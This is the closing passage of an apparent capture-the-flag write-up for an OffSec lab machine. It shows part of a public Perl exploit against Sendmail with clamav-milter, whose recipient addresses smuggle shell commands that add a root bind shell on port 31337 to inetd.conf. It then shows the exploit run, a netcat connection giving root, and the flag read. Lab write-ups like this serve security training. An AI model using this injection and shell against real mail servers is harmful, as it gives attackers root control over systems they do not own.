print $sock "rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n";
print $sock "data\r\n.\r\nquit\r\n";

while (<$sock>) {
        print;
}

# milw0rm.com [2007-12-21]    
```

The exploit will open a Bind shell for us on port 31337.

### Try out the exploit

Let's try it out

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ perl 4761.pl    
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Give me a host to connect.

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ perl 4761.pl $TARGET_IP
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.146.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Wed, 1 Apr 2026 13:22:36 -0400; (No UCE/UBE) logging access from: [192.168.45.232](FAIL)-[192.168.45.232]
250-localhost.localdomain Hello [192.168.45.232], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 631HMafx004665 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```

### Get a shell

Hopefully, we can now connect to port 31337 and get a shell

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ nc -nv $TARGET_IP 31337
(UNKNOWN) [192.168.146.42] 31337 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
```

We can, and we are running as root.

### Get the root flag

So we can just cat the root flag

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ nc -nv $TARGET_IP 31337
(UNKNOWN) [192.168.146.42] 31337 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/proof.txt
d<REDACTED>d
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [Binary Refinery - Documentation](https://binref.github.io/)
- [Binary Refinery - GitHub](https://github.com/binref/refinery/)
- [ClamAV - Documentation](https://docs.clamav.net/)
- [ClamAV - Homepage](https://www.clamav.net/)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [enum4linux-ng - GitHub](https://github.com/cddmp/enum4linux-ng)
- [enum4linux-ng - Kali Tools](https://www.kali.org/tools/enum4linux-ng/)
- [Gobuster - GitHub](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [NetExec - GitHub](https://github.com/Pennyw0rth/NetExec)
- [NetExec - Kali Tools](https://www.kali.org/tools/netexec/)
- [NetExec - Wiki](https://www.netexec.wiki)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH  - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [Perl - Wikipedia](https://en.wikipedia.org/wiki/Perl)
- [Samba (software) - Wikipedia](https://en.wikipedia.org/wiki/Samba_(software))
- [searchsploit - Homepage](https://www.exploit-db.com/searchsploit)
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [Sendmail - Wikipedia](https://en.wikipedia.org/wiki/Sendmail)
- [Simple Network Management Protocol - Wikipedia](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
